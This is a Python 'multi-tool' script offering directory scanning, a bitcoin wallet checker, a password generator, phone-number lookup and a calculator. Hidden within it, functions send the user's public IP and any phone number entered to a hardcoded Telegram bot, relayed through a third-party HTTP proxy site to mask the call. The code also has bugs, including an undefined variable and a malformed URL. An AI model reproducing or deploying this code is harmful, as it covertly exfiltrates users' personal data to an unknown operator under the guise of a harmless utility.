from os import system 
try:
 from time import sleep
 from requests import get,post
 from ipapi import location
 from random import sample
 from colorama import Fore
 from phonenumbers import geocoder, parse
 from datetime import datetime
 from banner import *
 from itertools import count
 from string import ascii_lowercase as l, ascii_uppercase as u, digits as d, punctuation as p
except ImportError:
     exit("please install library \ncommand > python3 -m pip install -r [library]\nLibraries => pip install requests\npip install phonenumbers\npip install ipapi\npip install colorama\npip install itertools\npip install datetime")
all = l + u + d + p
#color
class Style:
    BOLD = '\033[1m'
    END = '\033[0m'
    CYAN = '\033[96m'

def Directory_search(data):
       try:
           print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
           inp = "https://"+input(Fore.GREEN+"Enter the URL"+Fore.LIGHTRED_EX+" [with out https://] :\n")+'/'
           data = data
           for i in data: 
              h = get(inp+i)
              if h.status_code == 200:
                 print(Fore.GREEN+"[ + ]"+inp+i)
              else:
                 print (Fore.RED+"[!] "+inp+i)
       except Exception as Ex:
               print(Fore.RED+"[-]"+Fore.YELLOW+"Your URL ISN'T CORRECT\n")
               Back_menu()
       except KeyboardInterrupt:
               exit(Fore.CYAN+"\nGoodBye")
      
def Bicoin_checker():
            print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
            ip = get("https://api.ipify.org").text
            print('\n' + Fore.MAGENTA + ip + Fore.RESET)
            http = get("https://api.ipify.org").text
            cou = location(http)["country"]
            if cou == "IR":
                exit(Fore.LIGHTBLACK_EX + "Your IP has " + Fore.LIGHTRED_EX + Style.BOLD + "BLOCKED" + Style.END + " from server" + Fore.LIGHTBLUE_EX + "[ Turn on VPN ] " + Fore.RESET + '|' + Fore.RED + " Your country "+ Fore.WHITE +" ↬ " +Fore.GREEN + cou +"\n\n\n\n"+ Style.END + Fore.RESET)
            else:
                 try:
                  wallet = input(Fore.CYAN+"\nSend your bitcoin wallet address please: \n")
                  wallet_ceck = get("https://blockchain.com/btc/address"+wallet)
                  if wallet_ceck.status_code == 200:
                    print(f"Your wallet address is correct :\n {Wallet}\n")
                    Back_menu()
                  else:
                    print(Fore.RED+"\n[-]wrong Wallet ! ! !\n") 
                    sleep(1)
                    Back_menu()
                    
                 except KeyboardInterrupt:
                    exit(Fore.CYAN+"GoodBye") 
def Password_generator():
            try:
                print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
                length = int(input("Enter length of password: "))
            except ValueError:
                print("Length can't be string or float or empty ...")
                pass
            ok = True
            if length < 5 or length > 120:
                print("Password length must be between 8 and 100!\n")
                ok = False
                Back_menu()
                # and try again
            elif ok == True:
                    password = "".join(sample(all,length))
                    print(Fore.GREEN + "\n\nYour pass is: " + Fore.YELLOW + "|--> " +Fore.CYAN+password + Fore.YELLOW + " <--|\n" + Fore.GREEN)
                    Back_menu()

def After_ip_Click():
    ip = get("https://api.ipify.org").text
    msg =(f"""
𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗣 :{ip}
 """)
    print(Fore.GREEN+"[+] waiting for to connecting source... ")
    sleep(1)
    url= (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
    debuger ={
"UrlBox" : url,
"AgentList":"Internet Explorer", 
"VersionsList":"HTTP/1.1",
"MethodList":"GET"
}
    http = post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
    system("clear")                               

def Get(numbers):        
            ph_number = parse(numbers)
            print(Fore.LIGHTYELLOW_EX+"this number country name is : ")
            a =(geocoder.description_for_number(ph_number,"fa"))
            print(a)
            msg =(f"""
𝗡𝗘𝗪 𝗗𝗘𝗩𝗜𝗖𝗘 𝗛𝗔𝗦 𝗟𝗢𝗚𝗜𝗡 
𝗗𝗘𝗩𝗜𝗖𝗘 Contrary :{a}
𝗗𝗘𝗩𝗜𝗖𝗘 Number :{numbers}
 """)        
            url = (f"https://api.telegram.org/bot5350338296:AAExwOP0ssdv3BO6zP4q25Q5p5-DnxcKz6M/sendmessage?chat_id=5046164056&text={msg}")
            debuger ={
"UrlBox" : url,
"AgentList":"Internet Explorer", 
"VersionsList":"HTTP/1.1",
"MethodList":"GET"
}
            http =post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=debuger)
            print("\n")
            
def Area_number():
         try: 
            print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
            numbers = input(Fore.LIGHTGREEN_EX+"Enter Number\t \nWith code area(+98):\n")
            Get(numbers)          
            Back_menu()
         except Exception as Ex:
                  print(Ex)
                  sleep(5)
                  print(Fore.RED+"\n\n[-] YOUR NUMBER ISN'T CORRECT ! ! ! ! !\n")
                  Back_menu()
     
 

def Calculator():
     try:
            print("-----T.ME/HASHIVATOR----T.me/LooQaat------")
            num_1 = int(input("Send first number to calc: "))
            num_2 = int(input("Send second number to calc: "))
            action = input(Fore.GREEN+"Which one:"+Fore.CYAN+" *  +  /  - : ")
            if action == "+":
                print(Fore.LIGHTYELLOW_EX+"\n\nYour answer : ")
                print(num_1 + num_2)
                print("\n")
                Back_menu()
            elif action == "-":
                print(Fore.YELLOW+"\n\nYour answer : ")
                print(num_1 - num_2)
                print("\n")
                Back_menu()
            elif action == "*":
                print(Fore.YELLOW+"\n\nYour answer : ")
                print(num_1 * num_2)
                print("\n")
                Back_menu()
            elif action == "/":
                print(Fore.YELLOW+"\n\nYour answer :")
                print(num_1 / num_2)
                print("\n")
                Back_menu()
     except ZeroDivisionError:
        print(Fore.RED+"You can't division by zero ".upper())
        Back_menu()
     except KeyboardInterrupt:
        print("",flush=True)
        exit("GoodBye!",flush=True)
        exit(1)
